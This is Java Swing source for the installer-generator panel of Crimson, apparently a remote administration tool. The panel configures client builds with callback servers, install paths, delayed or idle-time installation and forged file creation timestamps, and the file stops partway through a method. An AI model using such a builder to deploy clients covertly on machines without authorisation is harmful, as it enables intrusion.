/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.viewer.ui.screen.generator;

import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.Insets;
import java.awt.Point;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.MouseMotionAdapter;
import java.io.File;
import java.text.DateFormat;
import java.util.Date;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import javax.swing.Box;
import javax.swing.BoxLayout;
import javax.swing.DefaultComboBoxModel;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSpinner;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SpinnerNumberModel;
import javax.swing.SwingConstants;
import javax.swing.border.BevelBorder;
import javax.swing.border.EtchedBorder;
import javax.swing.border.LineBorder;
import javax.swing.border.TitledBorder;

import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.proto.net.Gen;
import com.subterranean_security.crimson.core.proto.net.Auth.AuthType;
import com.subterranean_security.crimson.core.proto.net.Gen.ClientConfig;
import com.subterranean_security.crimson.core.proto.net.Gen.NetworkTarget;
import com.subterranean_security.crimson.core.ui.StatusLabel;
import com.subterranean_security.crimson.core.util.CUtil;
import com.subterranean_security.crimson.core.util.Crypto;
import com.subterranean_security.crimson.viewer.ui.screen.password.EntropyHarvester;

public class GenPanel extends JPanel {

	private static final long serialVersionUID = 1L;
	public JTextField fld_path;
	private JPanel otab;
	private JPanel ntab;
	private JPanel etab;
	private JPanel optab;
	public JTextField fld_ctime;
	private StatusLabel lbl_status;
	private JCheckBox cbx_waiver;
	private JTextField fld_group_name;
	private JTextArea txt_output_desc;
	private NetworkTargetTable table;
	private JTextField fld_server;
	private JTextField fld_port;
	private JCheckBox cbx_allow_win;
	private JCheckBox cbx_allow_lin;
	private JCheckBox cbx_allow_bsd;
	private JCheckBox cbx_allow_sol;
	private JCheckBox cbx_allow_osx;
	private JCheckBox cbx_allow_and;

	private static final String jar = "Runnable Java Archive (.jar)";
	private static final String exe = "Windows Portable Executable (.exe)";
	private static final String apk = "Android Application (.apk)";
	private static final String sh = "Shell Script (.sh)";
	private JSpinner fld_delay;
	private JSpinner fld_connect_period;

	private String group_text = "Group authentication is the most secure mechanism. A \"group key\" is embedded in the client and only servers that posses this key may authenticate with the client.";
	private String pass_text = "A simple password is used to authenticate the client. This is less secure than group authentication";
	private String none_text = "The client will request to skip authentication entirely.";

	private String[] ipath_win = new String[] { "C:/Users/%USERNAME%/Documents/Crimson" };
	private String[] ipath_lin = new String[] { "/home/%USERNAME%/.crimson" };
	private String[] ipath_osx = new String[] { "/home/%USERNAME%/.crimson" };
	private String[] ipath_sol = new String[] { "/home/%USERNAME%/.crimson" };
	private String[] ipath_bsd = new String[] { "/home/%USERNAME%/.crimson" };

	private static final String defaultHint = "set or load generation options";

	private Timer timer = new Timer();
	private GroupTimer gt = new GroupTimer();

	public GenPanel() {
		setLayout(new BorderLayout(0, 0));

		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.LEFT);
		add(tabbedPane, BorderLayout.CENTER);

		optab = new JPanel();
		tabbedPane.addTab(null, optab);
		tabbedPane.setTabComponentAt(0, new GenTabComponent("link", "Setup"));
		optab.setLayout(new BoxLayout(optab, BoxLayout.Y_AXIS));

		JPanel panel_3 = new JPanel();
		panel_3.setBorder(new TitledBorder(new LineBorder(new Color(184, 207, 229)), "Generation Type",
				TitledBorder.LEADING, TitledBorder.TOP, null, new Color(51, 51, 51)));
		optab.add(panel_3);

		type_comboBox = new JComboBox<String>();
		type_comboBox.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				switch ((String) type_comboBox.getSelectedItem()) {
				case jar: {
					changeToJar();
					return;
				}
				case exe: {
					changeToExe();
					return;
				}
				case apk: {
					changeToApk();
					return;
				}
				case sh: {
					changeToSh();
					return;
				}
				}
			}
		});
		panel_3.setLayout(new BorderLayout(0, 0));
		type_comboBox.setFont(new Font("Dialog", Font.BOLD, 11));
		type_comboBox.setModel(new DefaultComboBoxModel(new String[] { "Runnable Java Archive (.jar)",
				"Windows Portable Executable (.exe)", "Android Application (.apk)", "Shell Script (.sh)" }));
		panel_3.add(type_comboBox, BorderLayout.NORTH);

		JPanel panel_100 = new JPanel();

		panel_3.add(panel_100, BorderLayout.CENTER);
		panel_100.setLayout(new BorderLayout(0, 0));

		txt_output_desc = new JTextArea();
		txt_output_desc.setWrapStyleWord(true);
		txt_output_desc.setFont(new Font("Dialog", Font.PLAIN, 11));
		txt_output_desc.setLineWrap(true);
		txt_output_desc.setEditable(false);
		txt_output_desc.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		txt_output_desc.setOpaque(false);
		panel_100.add(txt_output_desc);
		panel_100.add(Box.createVerticalStrut(5), BorderLayout.NORTH);
		panel_3.add(Box.createHorizontalStrut(5), BorderLayout.EAST);
		panel_3.add(Box.createHorizontalStrut(5), BorderLayout.WEST);
		panel_3.add(Box.createVerticalStrut(5), BorderLayout.SOUTH);

		JPanel panel_1 = new JPanel();
		panel_1.setBorder(
				new TitledBorder(null, "Optional Information", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		optab.add(panel_1);
		panel_1.setLayout(new BorderLayout(0, 0));

		JPanel panel_15 = new JPanel();

		panel_1.add(panel_15, BorderLayout.CENTER);
		panel_15.setLayout(new BorderLayout(0, 0));

		JLabel lblInstallMessage = new JLabel("Install Message:");
		panel_15.add(lblInstallMessage, BorderLayout.WEST);
		lblInstallMessage.setFont(new Font("Dialog", Font.BOLD, 11));

		JScrollPane scrollPane = new JScrollPane();
		panel_15.add(scrollPane, BorderLayout.EAST);
		panel_15.add(Box.createVerticalStrut(5), BorderLayout.NORTH);
		panel_15.add(Box.createVerticalStrut(5), BorderLayout.SOUTH);

		fld_install_message = new JTextArea();
		fld_install_message.setColumns(25);
		fld_install_message.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseEntered(MouseEvent e) {
				lbl_status.setInfo("a message to be displayed on client installation");
			}

			@Override
			public void mouseExited(MouseEvent e) {
				lbl_status.setInfo(defaultHint);
			}
		});
		fld_install_message.setLineWrap(true);
		fld_install_message.setWrapStyleWord(true);
		fld_install_message.setFont(new Font("Dialog", Font.PLAIN, 10));
		scrollPane.setViewportView(fld_install_message);

		JPanel panel_16 = new JPanel();
		panel_1.add(panel_16, BorderLayout.NORTH);
		panel_16.setLayout(new BorderLayout(0, 0));

		JLabel lblIdentifier = new JLabel("Identifier:");
		panel_16.add(lblIdentifier, BorderLayout.WEST);

		textField = new JTextField();
		panel_16.add(textField, BorderLayout.EAST);
		textField.setColumns(15);

		etab = new JPanel();
		tabbedPane.addTab(null, etab);
		tabbedPane.setTabComponentAt(1, new GenTabComponent("checkerboard", "Execution"));
		etab.setLayout(null);

		JPanel panel_2 = new JPanel();
		panel_2.setBorder(
				new TitledBorder(null, "Allow Execution", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		panel_2.setBounds(12, 12, 341, 60);
		etab.add(panel_2);
		panel_2.setLayout(null);

		cbx_allow_win = new JCheckBox("Windows");
		cbx_allow_win.setFont(new Font("Dialog", Font.BOLD, 10));
		cbx_allow_win.setBounds(8, 18, 80, 17);
		panel_2.add(cbx_allow_win);

		cbx_allow_lin = new JCheckBox("Linux");
		cbx_allow_lin.setFont(new Font("Dialog", Font.BOLD, 10));
		cbx_allow_lin.setBounds(129, 18, 61, 17);
		panel_2.add(cbx_allow_lin);

		cbx_allow_bsd = new JCheckBox("BSD");
		cbx_allow_bsd.setFont(new Font("Dialog", Font.BOLD, 10));
		cbx_allow_bsd.setBounds(129, 37, 55, 17);
		panel_2.add(cbx_allow_bsd);

		cbx_allow_sol = new JCheckBox("Solaris");
		cbx_allow_sol.setFont(new Font("Dialog", Font.BOLD, 10));
		cbx_allow_sol.setBounds(8, 37, 71, 17);
		panel_2.add(cbx_allow_sol);

		cbx_allow_osx = new JCheckBox("Mac OS X");
		cbx_allow_osx.setFont(new Font("Dialog", Font.BOLD, 10));
		cbx_allow_osx.setBounds(216, 18, 85, 17);
		panel_2.add(cbx_allow_osx);

		cbx_allow_and = new JCheckBox("Android");
		cbx_allow_and.setFont(new Font("Dialog", Font.BOLD, 10));
		cbx_allow_and.setBounds(216, 37, 101, 17);
		panel_2.add(cbx_allow_and);

		JPanel panel_7 = new JPanel();
		panel_7.setBorder(new TitledBorder(null, "Options", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		panel_7.setBounds(12, 84, 341, 169);
		etab.add(panel_7);
		panel_7.setLayout(null);

		JLabel lblDelay = new JLabel("Delay:");
		lblDelay.setFont(new Font("Dialog", Font.BOLD, 11));
		lblDelay.setBounds(12, 20, 57, 15);
		panel_7.add(lblDelay);

		fld_delay = new JSpinner();
		fld_delay.setModel(new SpinnerNumberModel(0, 0, 3600, 1));
		fld_delay.setBounds(200, 17, 57, 19);
		panel_7.add(fld_delay);

		JLabel lblSeconds = new JLabel("seconds");
		lblSeconds.setFont(new Font("Dialog", Font.BOLD, 11));
		lblSeconds.setBounds(261, 20, 57, 15);
		panel_7.add(lblSeconds);

		JCheckBox chckbxRecoverFromErrors = new JCheckBox("Recover from errors");
		chckbxRecoverFromErrors.setFont(new Font("Dialog", Font.BOLD, 11));
		chckbxRecoverFromErrors.setBounds(12, 40, 306, 23);
		panel_7.add(chckbxRecoverFromErrors);

		JCheckBox chckbxInstallWhenIdle = new JCheckBox("Install when IDLE");
		chckbxInstallWhenIdle.setBounds(12, 67, 171, 25);
		panel_7.add(chckbxInstallWhenIdle);

		JPanel ptab = new JPanel();
		tabbedPane.addTab(null, ptab);
		tabbedPane.setTabComponentAt(2, new GenTabComponent("folder", "Paths"));
		ptab.setLayout(null);

		JPanel panel_6 = new JPanel();
		panel_6.setBorder(
				new TitledBorder(null, "Installation Directory", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		panel_6.setBounds(12, 12, 341, 144);
		ptab.add(panel_6);
		panel_6.setLayout(null);

		fld_install_windows = new JComboBox<String>();
		fld_install_windows.setFont(new Font("Dialog", Font.BOLD, 10));
		fld_install_windows.setModel(new DefaultComboBoxModel<String>(ipath_win));
		fld_install_windows.setEditable(true);
		fld_install_windows.setBounds(90, 17, 228, 19);
		panel_6.add(fld_install_windows);

		fld_install_linux = new JComboBox<String>();
		fld_install_linux.setFont(new Font("Dialog", Font.BOLD, 10));
		fld_install_linux.setModel(new DefaultComboBoxModel<String>(ipath_lin));
		fld_install_linux.setEditable(true);
		fld_install_linux.setBounds(90, 42, 228, 19);
		panel_6.add(fld_install_linux);

		fld_install_osx = new JComboBox<String>();
		fld_install_osx.setFont(new Font("Dialog", Font.BOLD, 10));
		fld_install_osx.setModel(new DefaultComboBoxModel<String>(ipath_osx));
		fld_install_osx.setEditable(true);
		fld_install_osx.setBounds(90, 67, 228, 19);
		panel_6.add(fld_install_osx);

		fld_install_bsd = new JComboBox<String>();
		fld_install_bsd.setFont(new Font("Dialog", Font.BOLD, 10));
		fld_install_bsd.setModel(new DefaultComboBoxModel<String>(ipath_bsd));
		fld_install_bsd.setEditable(true);
		fld_install_bsd.setBounds(90, 117, 228, 19);
		panel_6.add(fld_install_bsd);

		fld_install_solaris = new JComboBox<String>();
		fld_install_solaris.setFont(new Font("Dialog", Font.BOLD, 10));
		fld_install_solaris.setModel(new DefaultComboBoxModel<String>(ipath_sol));
		fld_install_solaris.setEditable(true);
		fld_install_solaris.setBounds(90, 92, 228, 19);
		panel_6.add(fld_install_solaris);

		JLabel lblWindows = new JLabel("Windows:");
		lblWindows.setFont(new Font("Dialog", Font.BOLD, 11));
		lblWindows.setBounds(12, 20, 70, 15);
		panel_6.add(lblWindows);

		JLabel lblLinux = new JLabel("Linux:");
		lblLinux.setBounds(12, 44, 70, 15);
		panel_6.add(lblLinux);

		JLabel lblOsX = new JLabel("OS X:");
		lblOsX.setBounds(12, 69, 70, 15);
		panel_6.add(lblOsX);

		JLabel lblSolaris = new JLabel("Solaris:");
		lblSolaris.setBounds(12, 94, 70, 15);
		panel_6.add(lblSolaris);

		JLabel lblBsd = new JLabel("BSD:");
		lblBsd.setBounds(12, 119, 70, 15);
		panel_6.add(lblBsd);

		ntab = new JPanel();
		tabbedPane.addTab(null, ntab);
		tabbedPane.setTabComponentAt(3, new GenTabComponent("computer", "Network"));
		ntab.setLayout(null);

		table = new NetworkTargetTable();
		table.setBounds(12, 12, 330, 65);
		ntab.add(table);

		JPanel panel_4 = new JPanel();
		panel_4.setBorder(new TitledBorder(new LineBorder(new Color(184, 207, 229)), "Add New Target",
				TitledBorder.LEADING, TitledBorder.TOP, null, new Color(51, 51, 51)));
		panel_4.setBounds(12, 80, 330, 66);
		ntab.add(panel_4);
		panel_4.setLayout(null);

		fld_server = new JTextField();
		fld_server.setBounds(72, 17, 246, 19);
		panel_4.add(fld_server);
		fld_server.setColumns(10);

		fld_port = new JTextField();
		fld_port.setBounds(72, 39, 47, 19);
		panel_4.add(fld_port);
		fld_port.setColumns(10);

		JButton btnAdd = new JButton("Add Target");
		btnAdd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				String server = fld_server.getText();
				String port = fld_port.getText();
				if (!CUtil.Validation.port(port)) {
					lbl_status.setBad("Invalid port");
					return;
				}
				for (NetworkTarget nt : table.getTargets()) {
					if (nt.getServer().equals(server) && nt.getPort() == Integer.parseInt(port)) {
						lbl_status.setBad("Target already exists");
						return;
					}
				}
				if (CUtil.Validation.dns(server) || CUtil.Validation.ip(server)) {
					table.add(NetworkTarget.newBuilder().setServer(server).setPort(Integer.parseInt(port)).build());
					fld_server.setText("");
					fld_port.setText("");
					lbl_status.setGood("Added Target");
				} else {
					lbl_status.setBad("Invalid server address");
					return;
				}

			}
		});
		btnAdd.setFont(new Font("Dialog", Font.BOLD, 10));
		btnAdd.setMargin(new Insets(2, 4, 2, 4));
		btnAdd.setBounds(240, 40, 78, 19);
		panel_4.add(btnAdd);

		JLabel lblPort = new JLabel("Port:");
		lblPort.setFont(new Font("Dialog", Font.BOLD, 11));
		lblPort.setBounds(12, 43, 53, 15);
		panel_4.add(lblPort);

		JLabel lblServer = new JLabel("Server:");
		lblServer.setFont(new Font("Dialog", Font.BOLD, 11));
		lblServer.setBounds(12, 20, 53, 15);
		panel_4.add(lblServer);

		JPanel panel_5 = new JPanel();
		panel_5.setBorder(
				new TitledBorder(null, "Network Options", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		panel_5.setBounds(12, 152, 330, 101);
		ntab.add(panel_5);
		panel_5.setLayout(null);

		fld_connect_period = new JSpinner();
		fld_connect_period.setModel(new SpinnerNumberModel(20, 5, 3600, 1));
		fld_connect_period.setBounds(207, 17, 55, 20);
		panel_5.add(fld_connect_period);

		JLabel lblConnectionPeriod = new JLabel("Connection Period:");
		lblConnectionPeriod.setFont(new Font("Dialog", Font.BOLD, 11));
		lblConnectionPeriod.setBounds(12, 20, 129, 15);
		panel_5.add(lblConnectionPeriod);

		JLabel lblSeconds_1 = new JLabel("seconds");
		lblSeconds_1.setFont(new Font("Dialog", Font.BOLD, 11));
		lblSeconds_1.setBounds(267, 20, 63, 15);
		panel_5.add(lblSeconds_1);

		JPanel atab = new JPanel();
		tabbedPane.addTab(null, atab);
		atab.setLayout(new BorderLayout(0, 0));

		JPanel panel_8 = new JPanel();
		panel_8.setBorder(
				new TitledBorder(null, "Authentication Type", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		atab.add(panel_8, BorderLayout.NORTH);
		panel_8.setLayout(new BorderLayout(0, 0));

		JTextArea txtrGroupAuthenticationIs = new JTextArea();
		txtrGroupAuthenticationIs.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		txtrGroupAuthenticationIs.setFont(new Font("Dialog", Font.PLAIN, 10));
		txtrGroupAuthenticationIs.setOpaque(false);
		txtrGroupAuthenticationIs.setWrapStyleWord(true);
		txtrGroupAuthenticationIs.setLineWrap(true);
		txtrGroupAuthenticationIs.setText(group_text);
		panel_8.add(txtrGroupAuthenticationIs, BorderLayout.CENTER);

		JPanel panel_10 = new JPanel();
		panel_8.add(panel_10, BorderLayout.WEST);

		JPanel panel_9 = new JPanel();
		atab.add(panel_9, BorderLayout.CENTER);
		panel_9.setLayout(new CardLayout(0, 0));

		authType = new JComboBox();
		authType.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				switch ((String) authType.getSelectedItem()) {
				case "Group": {
					txtrGroupAuthenticationIs.setText(group_text);
					((CardLayout) panel_9.getLayout()).show(panel_9, "group");
					break;
				}
				case "Password": {
					txtrGroupAuthenticationIs.setText(pass_text);
					((CardLayout) panel_9.getLayout()).show(panel_9, "Password");
					break;
				}
				case "None": {
					txtrGroupAuthenticationIs.setText(none_text);
					((CardLayout) panel_9.getLayout()).show(panel_9, "None");
					break;
				}
				}
			}
		});
		authType.setModel(new DefaultComboBoxModel(new String[] { "Group", "Password", "None" }));
		panel_10.add(authType);

		JPanel authpanel_group = new JPanel();
		panel_9.add(authpanel_group, "group");
		authpanel_group.setLayout(new BorderLayout(0, 0));

		JPanel panel_11 = new JPanel();
		panel_11.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		authpanel_group.add(panel_11, BorderLayout.NORTH);
		panel_11.setLayout(new BorderLayout(0, 0));

		JLabel lblGroupKeyPrefix = new JLabel("Group Key Prefix:");
		lblGroupKeyPrefix.setFont(new Font("Dialog", Font.BOLD, 11));
		panel_11.add(lblGroupKeyPrefix, BorderLayout.WEST);

		key_prefix = new JLabel("4 5 9 2 0 1 5 3 8 3 1 3 4 2 5 5");
		key_prefix.setFont(new Font("Dialog", Font.BOLD, 11));
		key_prefix.setHorizontalAlignment(SwingConstants.CENTER);
		panel_11.add(key_prefix, BorderLayout.CENTER);

		JPanel panel_12 = new JPanel();
		authpanel_group.add(panel_12);
		panel_12.setLayout(new BorderLayout(0, 0));

		JPanel panel_13 = new JPanel();
		panel_13.setBorder(new TitledBorder(null, "Settings", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		panel_12.add(panel_13, BorderLayout.NORTH);
		panel_13.setLayout(new BorderLayout(0, 0));

		JLabel lblGroupName = new JLabel("  Group Name:");
		panel_13.add(lblGroupName, BorderLayout.WEST);

		JPanel panel_14 = new JPanel();
		panel_13.add(panel_14, BorderLayout.EAST);

		fld_group_name = new JTextField();
		fld_group_name.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseEntered(MouseEvent e) {
				lbl_status.setInfo("A simple identifier for clients installed by this installer");
			}

			@Override
			public void mouseExited(MouseEvent e) {
				lbl_status.setInfo(defaultHint);
			}
		});
		fld_group_name.setBounds(130, 20, 117, 19);
		panel_14.add(fld_group_name);
		fld_group_name.setColumns(10);

		JButton btnRandom_1 = new JButton("Randomize");
		btnRandom_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				fld_group_name.setText("Grp-" + CUtil.Misc.randString(5));
			}
		});
		btnRandom_1.setMargin(new Insets(2, 2, 2, 2));
		btnRandom_1.setFont(new Font("Dialog", Font.BOLD, 9));
		btnRandom_1.setBounds(259, 20, 70, 19);
		panel_14.add(btnRandom_1);

		EntropyHarvester eh = new EntropyHarvester();
		eh.hpanel.addMouseMotionListener(new MouseMotionAdapter() {
			@Override
			public void mouseMoved(MouseEvent e) {

				gt.mix(e.getPoint());
			}
		});
		panel_12.add(eh, BorderLayout.CENTER);

		JPanel authpanel_password = new JPanel();
		authpanel_password.setBorder(
				new TitledBorder(null, "Password Authentication", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		panel_9.add(authpanel_password, "Password");

		JPanel authpanel_none = new JPanel();
		panel_9.add(authpanel_none, "None");

		JLabel lblNewLabel = new JLabel("Warning: Authentication mode is set to NONE");
		authpanel_none.add(lblNewLabel);

		JLabel lblThisClientWill = new JLabel("This client will be able to authenticate with any server!");
		lblThisClientWill.setFont(new Font("Dialog", Font.BOLD, 10));
		authpanel_none.add(lblThisClientWill);
		
		JLabel lblSslEncryptionWill = new JLabel("SSL encryption will still be used");
		lblSslEncryptionWill.setFont(new Font("Dialog", Font.BOLD, 10));
		authpanel_none.add(lblSslEncryptionWill);
		tabbedPane.setTabComponentAt(4, new GenTabComponent("lock", "Auth"));

		otab = new JPanel();
		otab.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));
		tabbedPane.addTab(null, otab);
		tabbedPane.setTabComponentAt(5, new GenTabComponent("linechart", "Output"));
		otab.setLayout(null);

		JPanel pl_output = new JPanel();
		pl_output.setBorder(
				new TitledBorder(null, "Output Location", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		pl_output.setBounds(12, 40, 330, 68);
		otab.add(pl_output);
		pl_output.setLayout(null);

		JButton btnBrowse = new JButton("Browse");
		btnBrowse.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JFileChooser jfc = new JFileChooser();
				if (jfc.showDialog(otab, "Select") == JFileChooser.APPROVE_OPTION) {
					File file = jfc.getSelectedFile();
					// TODO check extension
					fld_path.setText(file.getAbsolutePath());
				}
			}
		});
		btnBrowse.setFont(new Font("Dialog", Font.BOLD, 9));
		btnBrowse.setMargin(new Insets(2, 4, 2, 4));
		btnBrowse.setBounds(269, 18, 49, 19);
		pl_output.add(btnBrowse);

		fld_path = new JTextField();
		fld_path.setFont(new Font("Dialog", Font.PLAIN, 11));
		fld_path.setBounds(49, 18, 214, 19);
		pl_output.add(fld_path);
		fld_path.setColumns(10);

		JLabel lblFile = new JLabel("File:");
		lblFile.setFont(new Font("Dialog", Font.BOLD, 11));
		lblFile.setBounds(12, 20, 49, 15);
		pl_output.add(lblFile);

		JLabel lblApproximateOutputSize = new JLabel("Approximate Output Size:");
		lblApproximateOutputSize.setHorizontalAlignment(SwingConstants.CENTER);
		lblApproximateOutputSize.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		lblApproximateOutputSize.setFont(new Font("Dialog", Font.BOLD, 10));
		lblApproximateOutputSize.setBounds(20, 44, 290, 15);
		pl_output.add(lblApproximateOutputSize);

		cbx_waiver = new JCheckBox(
				"<html>I will use Crimson in accordance with all applicable laws and<br> never on unauthorized machines.");
		cbx_waiver.setFont(new Font("Dialog", Font.BOLD, 10));
		cbx_waiver.setBounds(12, 230, 333, 34);
		otab.add(cbx_waiver);

		JPanel pl_timestamps = new JPanel();
		pl_timestamps.setBorder(
				new TitledBorder(null, "Arbitrary Timestamps", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		pl_timestamps.setBounds(12, 120, 330, 47);
		otab.add(pl_timestamps);

		JButton btnRandom = new JButton("Random");
		btnRandom.setPreferredSize(new Dimension(55, 17));
		btnRandom.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				setCreationDate(new Date(CUtil.Misc.rand(0L, new Date().getTime())));
			}
		});
		pl_timestamps.setLayout(new FlowLayout(FlowLayout.CENTER, 5, 5));

		JLabel lblCreation = new JLabel("Creation:");
		lblCreation.setFont(new Font("Dialog", Font.BOLD, 11));
		pl_timestamps.add(lblCreation);

		fld_ctime = new JTextField();
		fld_ctime.setHorizontalAlignment(SwingConstants.CENTER);
		fld_ctime.setFont(new Font("Dialog", Font.PLAIN, 10));
		pl_timestamps.add(fld_ctime);
		fld_ctime.setColumns(24);
		btnRandom.setFont(new Font("Dialog", Font.BOLD, 9));
		btnRandom.setMargin(new Insets(1, 4, 1, 4));
		pl_timestamps.add(btnRandom);

		// JCalendarButton btnNewButton = new JCalendarButton(new Date());
		// btnNewButton.addPropertyChangeListener(new PropertyChangeListener() {
		// public void propertyChange(PropertyChangeEvent arg0) {
		// if (arg0.getNewValue() instanceof Date) {
		// Date target = (Date) arg0.getNewValue();
		// if (target != null) {
		// setCreationDate(target);
		// }
		// }

		// }
		// });
		// btnNewButton.setBounds(238, 20, 20, 19);
		// pl_timestamps.add(btnNewButton);

		JComboBox<String> comboBox_6 = new JComboBox<String>();
		comboBox_6.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				// sizes must come from server

			}
		});
		comboBox_6.setBounds(107, 8, 140, 24);
		otab.add(comboBox_6);
		comboBox_6.setModel(new DefaultComboBoxModel<String>(new String[] { "Downloader", "Integrated" }));

		JPanel panel = new JPanel();
		panel.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		add(panel, BorderLayout.SOUTH);
		panel.setLayout(new BorderLayout(0, 0));

		lbl_status = new StatusLabel();
		lbl_status.setInfo(defaultHint);
		panel.add(lbl_status);

		changeToJar();

		if (Common.isDebugMode()) {
			cbx_allow_win.setSelected(true);
			table.add(NetworkTarget.newBuilder().setServer("127.0.0.1").setPort(10101).build());
			fld_path.setText("C:/Users/dev/Desktop/client.jar");
			cbx_waiver.setSelected(true);
		}
		timer.schedule(gt, 0, 750);

	}

	public Date currentCTime;// see getvalues() for reasoning
	private JTextArea fld_install_message;
	private JComboBox<String> fld_install_windows;
	private JComboBox<String> fld_install_linux;
	private JComboBox<String> fld_install_osx;
	private JComboBox<String> fld_install_bsd;
	private JComboBox<String> fld_install_solaris;
	private JComboBox<String> type_comboBox;
	private JLabel key_prefix;
	private JTextField textField;
	private JComboBox authType;

	private void setCreationDate(Date d) {
		currentCTime = d;
		fld_ctime.setText(DateFormat.getDateTimeInstance(DateFormat.MEDIUM, DateFormat.SHORT).format(currentCTime));

	}

	public ClientConfig getValues() {

		if (!cbx_waiver.isSelected()) {
			return null;
		}

		ClientConfig.Builder ic = ClientConfig.newBuilder();

		ic.setOutputType((String) type_comboBox.getSelectedItem());
		ic.setDelay((int) fld_delay.getValue());
		ic.setReconnectPeriod((int) fld_connect_period.getValue());

		ic.setImsg(fld_install_message.getText());
		ic.setAllowBsd(cbx_allow_bsd.isSelected());
		ic.setAllowLin(cbx_allow_lin.isSelected());
		ic.setAllowOsx(cbx_allow_osx.isSelected());
		ic.setAllowSol(cbx_allow_sol.isSelected());
		ic.setAllowWin(cbx_allow_win.isSelected());
		ic.setAllowAnd(cbx_allow_and.isSelected());

		switch ((String) authType.getSelectedItem()) {
		case "Group": {
			ic.setAuthType(AuthType.GROUP);
			ic.setGroup(
					Gen.Group.newBuilder().setName(fld_group_name.getText()).setKey(CUtil.Misc.randString(64)).build());
			break;
		}
		case "Password": {
			ic.setAuthType(AuthType.PASSWORD);
			break;
		}
		case "None": {
			ic.setAuthType(AuthType.NO_AUTH);
			break;
		}
		}

		if (fld_install_windows.getSelectedItem() == null) {
			ic.setPathWin(ipath_win[0]);
		} else {
			ic.setPathWin((String) fld_install_windows.getSelectedItem());
		}

		if (fld_install_linux.getSelectedItem() == null) {
			ic.setPathLin(ipath_lin[0]);
		} else {
			ic.setPathLin((String) fld_install_linux.getSelectedItem());
		}

		if (fld_install_osx.getSelectedItem() == null) {
			ic.setPathOsx(ipath_osx[0]);
		} else {
			ic.setPathOsx((String) fld_install_osx.getSelectedItem());
		}

		if (fld_install_solaris.getSelectedItem() == null) {
			ic.setPathSol(ipath_sol[0]);
		} else {
			ic.setPathSol((String) fld_install_solaris.getSelectedItem());
		}

		if (fld_install_bsd.getSelectedItem() == null) {
			ic.setPathBsd(ipath_bsd[0]);
		} else {
			ic.setPathBsd((String) fld_install_bsd.getSelectedItem());
		}

		for (NetworkTarget nt : table.getTargets()) {
			if (nt != null) {
				ic.addTarget(nt);
			}
		}

		return ic.build();
	}

	public boolean testValues(ClientConfig config) {// TODO finsh

		if (config == null) {
			lbl_status.setBad("You must agree to the terms first");
			return false;
		}

		if (config.getTargetCount() == 0) {
			lbl_status.setBad("You must specify at least one server (Network Target)");
			return false;
		}

		// test paths
		if (!CUtil.Validation.path(config.getPathWin())) {
			lbl_status.setBad("Invalid Windows install path");
			return false;
		}

		if (!CUtil.Validation.path(config.getPathLin())) {
			lbl_status.setBad("Invalid Linux install path");
			return false;
		}

		if (!CUtil.Validation.path(config.getPathOsx())) {
			lbl_status.setBad("Invalid OSX install path");
			return false;
		}

		if (!CUtil.Validation.path(config.getPathSol())) {
			lbl_status.setBad("Invalid Solaris install path");
			return false;
		}

		if (!CUtil.Validation.path(config.getPathBsd())) {
			lbl_status.setBad("Invalid BSD install path");
			return false;
		}

		return true;
	}

	private void changeToJar() {

		txt_output_desc.setText(
				"A jar file installer can install Crimson on Windows, OS X, Linux, BSD, and Solaris machines, and is the most popular way to install Crimson.  Java 1.8 or greater is required before installation.");
		cbx_allow_and.setSelected(false);
		cbx_allow_and.setEnabled(false);
		cbx_allow_bsd.setEnabled(true);
		cbx_allow_lin.setEnabled(true);
		cbx_allow_osx.setEnabled(true);
		cbx_allow_sol.setEnabled(true);
		cbx_allow_win.setEnabled(true);
	}

	private void changeToExe() {

		txt_output_desc.setText(
				"An executable installer can install Crimson on Windows machines only.  Java is NOT required before installation.");
